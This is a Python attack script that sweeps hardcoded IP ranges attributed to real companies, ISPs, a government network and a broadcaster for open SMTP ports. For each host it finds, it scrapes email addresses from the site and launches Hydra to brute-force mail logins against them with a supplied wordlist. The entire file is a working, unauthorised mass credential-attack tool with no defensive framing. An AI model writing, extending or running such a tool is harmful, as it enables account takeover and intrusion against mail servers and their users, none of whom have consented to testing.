import socket
import asyncio
import logging
import ipaddress
import requests
from bs4 import BeautifulSoup
import subprocess
import sys
import re
import os

# Setting up logging
logging.basicConfig(filename='port_scan_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

# List of IP ranges for USA, Canada, and Europe (CIDR format)
ip_ranges = [
    # USA
    "172.217.0.0/28",  # Google
    "208.67.222.0/28",  # OpenDNS
    # Level 3 Communications
    "23.128.0.0/24",  # AT&T
    "12.34.56.0/24",  # Verizon
    "50.116.0.0/24",  # Linode (USA)
    "64.233.160.0/24",  # Google
    "199.85.126.0/24",  # Norton DNS
    "104.16.0.0/24",  # Cloudflare

    # Canada
    "64.68.80.0/24",  # Rogers Communications
    "24.48.0.0/24",  # Bell Canada
    "70.28.0.0/24",  # Shaw Communications
    "99.224.0.0/24",  # Rogers
    "76.65.0.0/24",  # Bell
    "184.75.0.0/24",  # Telus
    "198.27.0.0/24",  # OVH Canada
    "142.232.0.0/24",  # Government Network
    "206.162.0.0/24",  # SaskTel

    # UK
    "185.51.0.0/24",  # UK ISP
    "81.2.69.0/24",  # London Datacenter
    "51.140.0.0/24",  # Microsoft UK
    "31.55.186.0/24",  # BT Group
    "109.159.0.0/24",  # Sky Broadband UK

    # Europe
    "194.126.0.0/18",  # France
    "31.193.0.0/24",  # Germany
    "176.0.0.0/24",  # Germany
    "217.0.0.0/24",  # Netherlands
    "212.58.0.0/16",  # BBC UK
    "185.220.0.0/16",  # Switzerland ISP
    "37.120.0.0/24",  # Austria ISP
    "62.210.0.0/24",  # France OVH
    "5.104.0.0/16",  # Sweden ISP
    "2.16.0.0/24",  # Akamai CDN

    # Asia
    "103.228.0.0/18",  # India ISP
    "202.88.0.0/24",  # India Tata

    # Australia
    "139.130.0.0/24",  # Telstra Australia
    "203.10.0.0/24",  # Optus
    "203.24.0.0/24",  # TPG
    "202.47.0.0/24",  # iiNet

    # Middle East
    "185.62.0.0/16",  # UAE ISP
    "89.211.0.0/16",  # Saudi Telecom
    "37.211.0.0/18",  # Etisalat UAE
    # Kuwait

    # Africa
    "41.203.0.0/16",  # MTN South Africa
    "196.207.0.0/16",  # Maroc Telecom
    "102.129.0.0/16",  # Kenya ISP
    "105.96.0.0/24",  # Algeria ISP

    # South America
    "200.32.0.0/18",  # Argentina ISP
    "191.96.0.0/24",  # Brazil ISP
    "186.1.0.0/16",  # Chile ISP
    "181.0.0.0/24",  # Peru ISP
    "200.16.0.0/24",  # Uruguay ISP
]

# Define the ports to scan
ports_to_scan = [465, 587]

# Function to find email addresses on the domain's website and save to file
def find_emails(domain):
    try:
        response = requests.get(f'http://{domain}', timeout=3)
        soup = BeautifulSoup(response.text, 'html.parser')
        emails = set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', soup.text))
        
        # If emails are found, save to a file
        if emails:
            filename = f'{domain}-emails.txt'
            with open(filename, 'w') as f:
                for email in emails:
                    f.write(f"{email}\n")
            return filename  # Return the filename where emails are stored
        return None
    except requests.RequestException as e:
        print(f"Error accessing {domain}: {e}")
        return None

# Function to launch Hydra in an xterm session
def launch_hydra(target, email_file, wordlist, output_file):
    try:
        # Run Hydra with the given wordlist and log the output to a file
        subprocess.run(
            ['xterm', '-hold', '-e', f'hydra -s 465 -L {email_file} -P {wordlist} smtp://{target} -o {output_file}'],
            check=True
        )
    except subprocess.CalledProcessError as e:
        print(f"Error spawning Hydra: {e}")

async def check_port(ip, port, wordlist):
    """ Check if a specific port is open on the given IP address. """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            result = s.connect_ex((ip, port))
            if result == 0:
                domain = get_domain(ip)
                print(f"Open port {port} found on {ip}, domain: {domain}")
                logging.info(f"Open port {port} found on {ip}, domain: {domain}")

                # Find email addresses on the domain
                email_file = find_emails(domain)
                if email_file:
                    print(f"Found emails on {domain}, saved to {email_file}")
                    logging.info(f"Found emails on {domain}, saved to {email_file}")
                    
                    # If email is found, spawn Hydra with the provided wordlist
                    output_file = f"{domain}-out.txt"  # Hydra output file named after the domain
                    launch_hydra(domain, email_file, wordlist, output_file)
                else:
                    print(f"No emails found on {domain}.")
            else:
                return
    except socket.error as err:
        return

def get_domain(ip):
    """ Try to get the domain name of an IP via reverse DNS lookup. """
    try:
        domain = socket.gethostbyaddr(ip)[0]
    except socket.herror:
        domain = "No domain found"
    return domain

async def scan_ip_range(ip_range, wordlist):
    """ Scan a specific IP range for open ports 465 and 587. """
    print(f"Scanning IP range: {ip_range}...")
    network = ipaddress.ip_network(ip_range)  # Convert CIDR to a network object
    for ip in network.hosts():  # Iterate through the host IPs in the range
        for port in ports_to_scan:
            await check_port(str(ip), port, wordlist)  # Scan each IP for the defined ports

async def main():
    # Ensure that the wordlist is passed as an argument
    if len(sys.argv) < 2:
        print("Usage: python3 smtp.py <wordlist>")
        sys.exit(1)

    wordlist = sys.argv[1]  # Get wordlist argument from the command line

    for ip_range in ip_ranges:
        await scan_ip_range(ip_range, wordlist)  # Scan one range at a time

if __name__ == "__main__":
    asyncio.run(main())  # Using asyncio.run() to avoid deprecation warnings
